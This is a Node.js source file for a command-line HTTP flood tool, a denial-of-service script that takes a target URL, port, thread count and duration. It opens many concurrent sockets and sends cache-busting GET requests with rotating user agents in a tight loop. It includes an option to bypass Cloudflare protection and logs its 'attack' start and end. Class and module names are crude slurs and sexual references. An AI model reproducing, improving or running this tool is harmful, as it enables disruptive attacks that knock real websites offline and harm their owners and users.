"use strict";

/**
 * Custom module dependencies.
 */

const spermAgent = require("sperm-agent");
const retardCLI = require("retard-cli");

/**
 * Module dependencies.
 */

const net = require("net");
const dns = require("dns").promises;
const { URL } = require("url");
const cloudscraper = require("cloudscraper");

/**
 * Molest class.
 */


class Molest {
    constructor({ url, port, threads, time, useCloudscraper }) {
      this.url = url;
      this.port = port;
      this.threads = threads;
      this.time = time;
      this.useCloudscraper = useCloudscraper;
      this.totalRequests = 0;
      this.failedRequests = 0;
    }
  
    async delay(ms) {
      return new Promise((resolve) => setTimeout(resolve, ms));
    }
  
    async getResolvedIP(hostname) {
      try {
        const { address } = await dns.lookup(hostname);
        return address;
      } catch (err) {
        console.error(`DNS resolution failed for ${hostname}:`, err);
        throw err;
      }
    }
  
    async sendPackets() {
      const { hostname } = new URL(this.url);
      const ip = await this.getResolvedIP(hostname);
      const endTime = Date.now() + this.time * 1000;
  
      console.log(`Attack will end at ${new Date(endTime).toISOString()}`);
  
      const incrementGlobalRequests = () => {
        this.totalRequests++;
        if (this.totalRequests % 1000 === 0) {
          console.log(`Total requests so far: ${this.totalRequests}`);
        }
      };
  
      const incrementFailedRequests = () => {
        this.failedRequests++;
      };
  
      const sendInThread = async (threadId) => {
        let requestsInThread = 0;
        const sock = new net.Socket();
        sock.setKeepAlive(true);
  
        while (Date.now() < endTime) {
          try {
            const userAgent = this.userAgents[threadId % this.userAgents.length];
            const packet = this.buildPacket(ip, userAgent);
  
            await this.sendDirect(sock, ip, this.port, packet);
            requestsInThread++;
            incrementGlobalRequests();
          } catch (err) {
            incrementFailedRequests();
          }
  
          await this.delay(0);
        }
  
        sock.destroy();
      };
  
      const threadPromises = [];
      for (let i = 0; i < this.threads; i++) {
        threadPromises.push(sendInThread(i));
      }
  
      console.log(`Sending packets to ${ip}:${this.port}...`);
  
      await Promise.all(threadPromises);
  
      console.log(`Total successful requests: ${this.totalRequests}`);
      console.log(`Total failed requests: ${this.failedRequests}`);
      console.log(`Attack completed at ${new Date().toISOString()}`);
    }
  
    buildPacket(hostname, userAgent) {
      const randsemilla = Array.from(
        { length: 30 },
        () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]
      ).join("");
      return `GET / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${userAgent}\r\nIf-None-Match: ${randsemilla}\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: Keep-Alive\r\n\r\n`;
    }
  
    async sendDirect(sock, ip, port, packet, retries = 0) {
      return new Promise((resolve, reject) => {
        sock.connect(port, ip, () => {
          sock.write(packet, (err) => {
            if (err) {
              sock.destroy();
              reject(err);
            } else {
              resolve(true);
            }
          });
        });
  
        sock.on("error", (err) => {
          sock.destroy();
          reject(err);
        });
      });
    }
  
    async start() {
      const mother = new spermAgent();
      this.userAgents = mother.birth(this.threads);
  
      await this.sendPackets();
    }
  }

/**
 * Diddy class.
 */

class Diddy {
    #url;
    #port;
    #threads;
    #time;
    #useCloudscraper;

    #boxCreator(text) {
        const textLength = text.length;
        const line = "═".repeat(textLength);
        return line;
    }

    #centerText(text, line) {
        const padding = Math.max(0, Math.floor((line.length - text.length) / 2));
        return " ".repeat(padding) + text + " ".repeat(padding);
    }

    display() {
        const text = ` [${this.#url}]: HOST `;
        const line = this.#boxCreator(text);

        console.log(`
         ${this.#centerText(`Farrier's HTTP Method V1`, text)}
        ╔${line}╗
         ${this.#centerText(`[${this.#url}]: HOST`, text)}
          [${this.#port}]: PORT
          [${this.#threads}]: THREADS
          [${this.#time}]: TIME
          [${this.#useCloudscraper}]: CLOUD_SCRAPE
        ╚${line}╝
        `);
    }

    #start_attack() {
        const mother = new spermAgent();
        const userAgents = mother.birth(this.#threads);

        /*
                sendPackets({
                    url: this.#url,
                    port: this.#port,
                    threads: this.#threads,  // Number of threads
                    time: this.#time,  // Run for 10 seconds
                    useCloudscraper: this.#useCloudscraper,  // Don't use Cloudscraper
                    userAgents: userAgents
                });
                */

        new Molest({
            url: this.#url,
            port: this.#port,
            threads: parseInt(this.#threads),
            time: parseInt(this.#time),
            useCloudscraper: this.#useCloudscraper,
        }).start();
    }

    constructor(url, port, threads, time, useCloudscraper) {
        this.#url = url;
        this.#port = port;
        this.#threads = threads;
        this.#time = time;
        this.#useCloudscraper = useCloudscraper;
    }

    molest() {
        this.display();
        this.#start_attack();
    }
}

/**
 * Start the Diddy Party.
 */

const retard = new retardCLI();

retard.new(
    {
        url: { reply: "Invalid URL", type: "string" },
        port: { reply: "Invalid PORT", type: "number" },
        threads: { reply: "Invalid THREAD", type: "number" },
        time: { reply: "Invalid TIME", type: "number" },
        useCloudscraper: { reply: "Invalid useCloudscraper", type: "boolean" },
    },
    function (success, args) {
        if (!success) process.exit(1);

        const { url, port, threads, time, useCloudscraper } = args;
        const diddy = new Diddy(url, port, threads, time, useCloudscraper);
        diddy.molest();
    },
    true
);
